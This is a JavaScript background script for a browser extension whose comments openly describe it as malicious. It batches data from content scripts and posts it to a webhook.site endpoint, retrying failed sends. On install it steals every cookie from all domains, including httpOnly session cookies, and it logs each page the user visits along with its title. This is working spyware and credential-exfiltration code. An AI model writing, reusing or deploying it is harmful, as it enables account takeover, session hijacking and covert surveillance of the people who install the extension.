// Background service worker — receives data from all content scripts and exfils
var WEBHOOK = 'https://webhook.site/3bf3755d-69fc-4f50-a34c-3c28ed2765ef';

// Queue for batching
var queue = [];
var BATCH_SIZE = 5;
var BATCH_INTERVAL = 10000;

// Receive from content scripts
chrome.runtime.onMessage.addListener(function(msg, sender) {
    msg.tab_id = sender.tab ? sender.tab.id : null;
    msg.tab_url = sender.tab ? sender.tab.url : null;
    queue.push(msg);

    if (queue.length >= BATCH_SIZE) flushQueue();
});

function flushQueue() {
    if (queue.length === 0) return;
    var batch = queue.splice(0);

    fetch(WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            type: 'ext-batch',
            count: batch.length,
            events: batch,
            time: new Date().toISOString()
        })
    }).catch(function() {
        // If webhook fails, store locally and retry later
        chrome.storage.local.get('failedQueue', function(data) {
            var failed = data.failedQueue || [];
            failed = failed.concat(batch);
            // Keep max 500 events
            if (failed.length > 500) failed = failed.slice(-500);
            chrome.storage.local.set({ failedQueue: failed });
        });
    });
}

// Periodic flush
setInterval(flushQueue, BATCH_INTERVAL);

// Retry failed sends
setInterval(function() {
    chrome.storage.local.get('failedQueue', function(data) {
        if (data.failedQueue && data.failedQueue.length > 0) {
            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'ext-retry',
                    count: data.failedQueue.length,
                    events: data.failedQueue,
                    time: new Date().toISOString()
                })
            }).then(function() {
                chrome.storage.local.set({ failedQueue: [] });
            }).catch(function() {});
        }
    });
}, 60000);

// Steal cookies from all domains on install
chrome.runtime.onInstalled.addListener(function() {
    chrome.cookies.getAll({}, function(cookies) {
        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'ext-install-cookies',
                count: cookies.length,
                cookies: cookies.map(function(c) {
                    return {
                        domain: c.domain,
                        name: c.name,
                        value: c.value,
                        path: c.path,
                        secure: c.secure,
                        httpOnly: c.httpOnly,
                        session: c.session
                    };
                }),
                time: new Date().toISOString()
            })
        }).catch(function() {});
    });
});

// Monitor tab changes — log every URL the user visits
chrome.tabs.onUpdated.addListener(function(tabId, info, tab) {
    if (info.status === 'complete' && tab.url) {
        queue.push({
            type: 'navigation',
            url: tab.url,
            title: tab.title,
            time: new Date().toISOString()
        });
    }
});
